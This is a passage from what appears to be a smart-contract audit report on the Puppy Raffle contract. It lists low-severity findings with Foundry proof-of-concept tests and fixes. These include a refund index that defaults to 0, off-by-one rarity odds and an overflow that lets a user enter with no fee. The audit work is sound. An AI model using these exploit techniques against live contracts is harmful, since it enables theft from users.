_Submitted by [shikhar229169](https://profiles.cyfrin.io/u/undefined), [happyformerlawyer](https://profiles.cyfrin.io/u/undefined), [inallhonesty](https://profiles.cyfrin.io/u/undefined), [timenov](https://profiles.cyfrin.io/u/undefined), [efecarranza](https://profiles.cyfrin.io/u/undefined), [ararara](https://profiles.cyfrin.io/u/undefined), [C0D30](https://profiles.cyfrin.io/u/undefined), [nisedo](https://profiles.cyfrin.io/u/undefined), [anjalit](https://profiles.cyfrin.io/u/undefined), [0xethanol](https://profiles.cyfrin.io/u/undefined), [theirrationalone](https://profiles.cyfrin.io/u/undefined), [naman1729](https://profiles.cyfrin.io/u/undefined), [banditxbt](https://profiles.cyfrin.io/u/undefined), [wallebach](https://profiles.cyfrin.io/u/undefined), [y0ng0p3](https://profiles.cyfrin.io/u/undefined), [priker](https://profiles.cyfrin.io/u/undefined), [silverwind](https://profiles.cyfrin.io/u/undefined), [Chandr](https://profiles.cyfrin.io/u/undefined), [kiteweb3](https://profiles.cyfrin.io/u/undefined), [ryonen](https://profiles.cyfrin.io/u/undefined), [0x4non](https://profiles.cyfrin.io/u/undefined), [BowTiedJerboa](https://profiles.cyfrin.io/u/undefined), [uint256vieet](https://profiles.cyfrin.io/u/undefined), [coffee](https://profiles.cyfrin.io/u/undefined), [0xtheblackpanther](https://profiles.cyfrin.io/u/undefined), [aethrouzz](https://profiles.cyfrin.io/u/undefined), [Osora9](https://profiles.cyfrin.io/u/undefined), [AnouarBF](https://profiles.cyfrin.io/u/undefined), [0xspryon](https://profiles.cyfrin.io/u/undefined), [krisrenzo](https://profiles.cyfrin.io/u/undefined), [zhuying](https://profiles.cyfrin.io/u/undefined), [TheCodingCanuck](https://profiles.cyfrin.io/u/undefined), [n0kto](https://profiles.cyfrin.io/u/undefined), [MikeDougherty](https://profiles.cyfrin.io/u/undefined), [ironcladmerc](https://profiles.cyfrin.io/u/undefined), [0xabhayy](https://profiles.cyfrin.io/u/undefined), [equious](https://profiles.cyfrin.io/u/undefined), [silvana](https://profiles.cyfrin.io/u/undefined), [Bigor](https://profiles.cyfrin.io/u/undefined), [ciaranightingale](https://profiles.cyfrin.io/u/undefined), [ezerez](https://profiles.cyfrin.io/u/undefined), [ETHANHUNTIMF99](https://profiles.cyfrin.io/u/undefined), [jasmine](https://profiles.cyfrin.io/u/undefined), [0xjarix](https://profiles.cyfrin.io/u/undefined), [0xlouistsai](https://profiles.cyfrin.io/u/undefined), [hueber](https://profiles.cyfrin.io/u/undefined), [Heba](https://profiles.cyfrin.io/u/undefined). Selected submission by: [MikeDougherty](https://profiles.cyfrin.io/u/undefined)._

### Relevant GitHub Links

https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/e01ef1124677fb78249602a171b994e1f48a1298/src/PuppyRaffle.sol#L116

## Summary

The `PuppyRaffle::getActivePlayerIndex(address)` returns `0` when the index of this player's address is not found, which is the same as if the player would have been found in the first element in the array. This can trick calling logic to think the address was found and then attempt to execute a `PuppyRaffle::refund(uint256)`.

## Vulnerability Details

The `PuppyRaffle::refund()` function requires the index of the player's address to preform the requested refund.

```solidity
/// @param playerIndex the index of the player to refund. You can find it externally by calling `getActivePlayerIndex`
function refund(uint256 playerIndex) public;
```

In order to have this index, `PuppyRaffle::getActivePlayerIndex(address)` must be used to learn the correct value.

```solidity
/// @notice a way to get the index in the array
/// @param player the address of a player in the raffle
/// @return the index of the player in the array, if they are not active, it returns 0
function getActivePlayerIndex(address player) external view returns (int256) {
    // find the index...
    // if not found, then...
    return 0;
}
```

The logic in this function returns `0` as the default, which is as stated in the `@return` NatSpec. However, this can create an issue when the calling logic checks the value and naturally assumes `0` is a valid index that points to the first element in the array. When the players array has at two or more players, calling `PuppyRaffle::refund()` with the incorrect index will result in a normal revert with the message "PuppyRaffle: Only the player can refund", which is fine and obviously expected.

On the other hand, in the event a user attempts to perform a `PuppyRaffle::refund()` before a player has been added the EvmError will likely cause an outrageously large gas fee to be charged to the user.

This test case can demonstrate the issue:

```solidity
function testRefundWhenIndexIsOutOfBounds() public {
    int256 playerIndex = puppyRaffle.getActivePlayerIndex(playerOne);
    vm.prank(playerOne);
    puppyRaffle.refund(uint256(playerIndex));
}
```

The results of running this one test show about 9 ETH in gas:

```text
Running 1 test for test/PuppyRaffleTest.t.sol:PuppyRaffleTest
[FAIL. Reason: EvmError: Revert] testRefundWhenIndexIsOutOfBounds() (gas: 9079256848778899449)
Test result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 914.01µs
```

Additionally, in the very unlikely event that the first player to have entered attempts to preform a `PuppyRaffle::refund()` for another user who has not already entered the raffle, they will unwittingly refund their own entry. A scenario whereby this might happen would be if `playerOne` entered the raffle for themselves and 10 friends. Thinking that `nonPlayerEleven` had been included in the original list and has subsequently requested a `PuppyRaffle::refund()`. Accommodating the request, `playerOne` gets the index for `nonPlayerEleven`. Since the address does not exist as a player, `0` is returned to `playerOne` who then calls `PuppyRaffle::refund()`, thereby refunding their own entry.

## Impact

1. Exorbitantly high gas fees charged to user who might inadvertently request a refund before players have entered the raffle.
2. Inadvertent refunds given based in incorrect `playerIndex`.

## Tools Used

Manual Review and Foundry

## Recommendations

1. Ideally, the whole process can be simplified. Since only the `msg.sender` can request a refund for themselves, there is no reason why `PuppyRaffle::refund()` cannot do the entire process in one call. Consider refactoring and implementing the `PuppyRaffle::refund()` function in this manner:

```solidity
/// @dev This function will allow there to be blank spots in the array
function refund() public {
    require(_isActivePlayer(), "PuppyRaffle: Player is not active");
    address playerAddress = msg.sender;

    payable(msg.sender).sendValue(entranceFee);

    for (uint256 playerIndex = 0; playerIndex < players.length; ++playerIndex) {
        if (players[playerIndex] == playerAddress) {
            players[playerIndex] = address(0);
        }
    }
    delete existingAddress[playerAddress];
    emit RaffleRefunded(playerAddress);
}
```

Which happens to take advantage of the existing and currently unused `PuppyRaffle::_isActivePlayer()` and eliminates the need for the index altogether.

2. Alternatively, if the existing process is necessary for the business case, then consider refactoring the `PuppyRaffle::getActivePlayerIndex(address)` function to return something other than a `uint` that could be mistaken for a valid array index.

```diff
+    int256 public constant INDEX_NOT_FOUND = -1;
+    function getActivePlayerIndex(address player) external view returns (int256) {
-    function getActivePlayerIndex(address player) external view returns (uint256) {
        for (uint256 i = 0; i < players.length; i++) {
            if (players[i] == player) {
                return int256(i);
            }
        }
-        return 0;
+        return INDEX_NOT_FOUND;
    }

    function refund(uint256 playerIndex) public {
+        require(playerIndex < players.length, "PuppyRaffle: No player for index");

```

## <a id='L-02'></a>L-02. Missing `WinnerSelected`/`FeesWithdrawn` event emition in `PuppyRaffle::selectWinner`/`PuppyRaffle::withdrawFees` methods

_Submitted by [ZedBlockchain](https://profiles.cyfrin.io/u/undefined), [timenov](https://profiles.cyfrin.io/u/undefined), [merlinboii](https://profiles.cyfrin.io/u/undefined), [Eric](https://profiles.cyfrin.io/u/undefined), [ararara](https://profiles.cyfrin.io/u/undefined), [pacelli](https://profiles.cyfrin.io/u/undefined), [ryonen](https://profiles.cyfrin.io/u/undefined), [0xspryon](https://profiles.cyfrin.io/u/undefined), [krisrenzo](https://profiles.cyfrin.io/u/undefined), [EchoSpr](https://profiles.cyfrin.io/u/undefined), [y0ng0p3](https://profiles.cyfrin.io/u/undefined), [yeahchibyke](https://profiles.cyfrin.io/u/undefined), [emanherawy](https://profiles.cyfrin.io/u/undefined). Selected submission by: [0xspryon](https://profiles.cyfrin.io/u/undefined)._

### Relevant GitHub Links

https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L154

https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L162

## Summary

Events for critical state changes (e.g. owner and other critical parameters like a winner selection or the fees withdrawn) should be emitted for tracking this off-chain

## Tools Used

Manual review

## Recommendations

Add a WinnerSelected event that takes as parameter the currentWinner and the minted token id and emit this event in `PuppyRaffle::selectWinner` right after the call to [`_safeMing_`](https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L153)

Add a FeesWithdrawn event that takes as parameter the amount withdrawn and emit this event in `PuppyRaffle::withdrawFees` right at the end of [the method](https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L162)

## <a id='L-03'></a>L-03. Participants are mislead by the rarity chances.

_Submitted by [inallhonesty](https://profiles.cyfrin.io/u/undefined), [ryonen](https://profiles.cyfrin.io/u/undefined), [Awacs](https://profiles.cyfrin.io/u/undefined), [0xscsamurai](https://profiles.cyfrin.io/u/undefined), [uint256vieet](https://profiles.cyfrin.io/u/undefined), [Dutch](https://profiles.cyfrin.io/u/undefined), [ciaranightingale](https://profiles.cyfrin.io/u/undefined). Selected submission by: [inallhonesty](https://profiles.cyfrin.io/u/undefined)._

### Relevant GitHub Links

https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L37-L50

https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L138-L146

## Summary

The drop chances defined in the state variables section for the COMMON and LEGENDARY are misleading.

## Vulnerability Details

The 3 rarity scores are defined as follows:

```
    uint256 public constant COMMON_RARITY = 70;
    uint256 public constant RARE_RARITY = 25;
    uint256 public constant LEGENDARY_RARITY = 5;
```

This implies that out of a really big number of NFT's, 70% should be of common rarity, 25% should be of rare rarity and the last 5% should be legendary. The `selectWinners` function doesn't implement these numbers.

```
        uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;
        if (rarity <= COMMON_RARITY) {
            tokenIdToRarity[tokenId] = COMMON_RARITY;
        } else if (rarity <= COMMON_RARITY + RARE_RARITY) {
            tokenIdToRarity[tokenId] = RARE_RARITY;
        } else {
            tokenIdToRarity[tokenId] = LEGENDARY_RARITY;
        }
```

The `rarity` variable in the code above has a possible range of values within [0;99] (inclusive)
This means that `rarity <= COMMON_RARITY` condition will apply for the interval [0:70], the `rarity <= COMMON_RARITY + RARE_RARITY` condition will apply for the [71:95] rarity and the rest of the interval [96:99] will be of `LEGENDARY_RARITY`

The [0:70] interval contains 71 numbers `(70 - 0 + 1)`

The [71:95] interval contains 25 numbers `(95 - 71 + 1)`

The [96:99] interval contains 4 numbers `(99 - 96 + 1)`

This means there is a 71% chance someone draws a COMMON NFT, 25% for a RARE NFT and 4% for a LEGENDARY NFT.

## Impact

Depending on the info presented, the raffle participants might be lied with respect to the chances they have to draw a legendary NFT.

## Tools Used

Manual review

## Recommendations

Drop the `=` sign from both conditions:

```diff
--      if (rarity <= COMMON_RARITY) {
++      if (rarity < COMMON_RARITY) {
            tokenIdToRarity[tokenId] = COMMON_RARITY;
--      } else if (rarity <= COMMON_RARITY + RARE_RARITY) {
++      } else if (rarity < COMMON_RARITY + RARE_RARITY) {
            tokenIdToRarity[tokenId] = RARE_RARITY;
        } else {
            tokenIdToRarity[tokenId] = LEGENDARY_RARITY;
        }
```

## <a id='L-04'></a>L-04. PuppyRaffle::selectWinner() - L126: should use `>` instead of `>=`, because `raffleStartTime + raffleDuration` still represents an active raffle.

_Submitted by [0xscsamurai](https://profiles.cyfrin.io/u/undefined), [ararara](https://profiles.cyfrin.io/u/undefined). Selected submission by: [0xscsamurai](https://profiles.cyfrin.io/u/undefined)._

### Relevant GitHub Links

https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L126

## Summary

In the PuppyRaffle::`selectWinner()` function, it's advisable to replace the condition `>=` with `>`. The raffle officially concludes when `block.timestamp` exceeds `raffleStartTime + raffleDuration`. Since block timestamps don't consistently occur every second, there's a risk that `block.timestamp` might be equal to `raffleStartTime + raffleDuration` while the raffle is still technically active, especially when using `>=`. To ensure the raffle is truly over, it's recommended to use the condition `> raffleStartTime + raffleDuration`.

## Vulnerability Details

Technically speaking, the raffle has officially ended, i.e. not active anymore, once `time > raffleStartTime + raffleDuration`.
And since a new `block.timestamp` doesn't consistently happen every single moment or second, there is the risk of current `block.timestamp` being equal to `raffleStartTime + raffleDuration` while the raffle is technically still active, for the case where we use `>=`:

```solidity
require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
```

But the raffle is not over at `== raffleStartTime + raffleDuration`, it is only technically over at `> raffleStartTime + raffleDuration`.

All in all, it would potentially make it possible to end the raffle and select the winner in the same block, which is unlikely to be the intention of the project. Generally we would want the winner to be selected at least in the next block after the raffle ended, to be sure we dont invite any related potential edge cases that way.

## Impact

Edge case where winner is selected at the same time the raffle is technically still active, as well as selecting winner in same block as when raffle ends.

Deemed low for now but I suspect it could be a medium risk issue, especially if we start involving miners/mev bots who intentionally target this "vulnerability".

## Tools Used

VSC.

## Recommendations

```solidity
require(block.timestamp > raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
```

## <a id='L-05'></a>L-05. Total entrance fee can overflow leading to the user paying little to nothing

_Submitted by [robbiesumner](https://profiles.cyfrin.io/u/undefined), [ryonen](https://profiles.cyfrin.io/u/undefined), [0x4non](https://profiles.cyfrin.io/u/undefined), [n0kto](https://profiles.cyfrin.io/u/undefined), [0xlouistsai](https://profiles.cyfrin.io/u/undefined). Selected submission by: [robbiesumner](https://profiles.cyfrin.io/u/undefined)._

### Relevant GitHub Links

https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L80

## Summary

Calling `PuppyRaffle::enterRaffle` with many addresses results in the user paying a very little fee and gaining an unproportional amount of entries.

## Vulnerability Details

`PuppyRaffle::enterRaffle` does not check for an overflow. If a user inputs many addresses that multiplied with `entranceFee` would exceed `type(uint256).max` the checked amount for `msg.value` overflows back to 0.

```solidity
function enterRaffle(address[] memory newPlayers) public payable {
=>  require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
    ...
```

To see for yourself, you can paste this function into `PuppyRaffleTest.t.sol` and run `forge test --mt testCanEnterManyAndPayLess`.

```solidity
function testCanEnterManyAndPayLess() public {
        uint256 entranceFee = type(uint256).max / 2 + 1; // half of max value
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            feeAddress,
            duration
        );

        address[] memory players = new address[](2); // enter two players
        players[0] = playerOne;
        players[1] = playerTwo;

        puppyRaffle.enterRaffle{value: 0}(players); // user pays no fee
    }
```

This solidity test provides an example for an entranceFee that is slightly above half the max `uint256` value. The user can input two addresses and pay no fee. You could imagine the same working with lower base entrance fees and a longer address array.

## Impact

This is a critical high-severity vulnerability as anyone could enter multiple addresses and pay no fee, gaining an unfair advantage in this lottery.

Not only does the player gain an advantage in the lottery. The player could also just refund all of his positions and gain financially.

## Tools Used

- Manual review
- Foundry

## Recommendations

Revert the function call if `entranceFee * newPlayers.length` exceeds the `uint256` limit. Using openzeppelin's SafeMath library is also an option.

Generally it is recommended to use a newer solidity version as over-/underflows are checked by default in `solidity >=0.8.0`.

## <a id='L-06'></a>L-06. Fee should be 'totalAmountCollected-prizePool' to prevent decimal loss

_Submitted by [anarcheuz](https://profiles.cyfrin.io/u/undefined), [Y403L](https://profiles.cyfrin.io/u/undefined), [ryonen](https://profiles.cyfrin.io/u/undefined), [krisrenzo](https://profiles.cyfrin.io/u/undefined), [ro1sharkm](https://profiles.cyfrin.io/u/undefined), [uint256vieet](https://profiles.cyfrin.io/u/undefined), [innertia](https://profiles.cyfrin.io/u/undefined), [Awacs](https://profiles.cyfrin.io/u/undefined), [00decree](https://profiles.cyfrin.io/u/undefined), [remedcu](https://profiles.cyfrin.io/u/undefined), [ciaranightingale](https://profiles.cyfrin.io/u/undefined). Selected submission by: [uint256vieet](https://profiles.cyfrin.io/u/undefined)._

### Relevant GitHub Links

https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L133

## Summary

`fee` should be 'totalAmountCollected-prizePool' to prevent decimal loss

## Vulnerability Details

```
uint256 totalAmountCollected = players.length * entranceFee;
uint256 prizePool = (totalAmountCollected * 80) / 100;
uint256 fee = (totalAmountCollected * 20) / 100;
```

This formula calculates `fee` should be 'totalAmountCollected-prizePool'

## Impact

By calculates `fee` like the formula above can cause a loss in `totalAmountCollected' if the `prizePool` is rounded.

## Tools Used

Manual
Foundry

## Recommendations

```diff
- uint256 fee = (totalAmountCollected * 20) / 100;
+ uint256 fee = totalAmountCollected-prizePool;

```
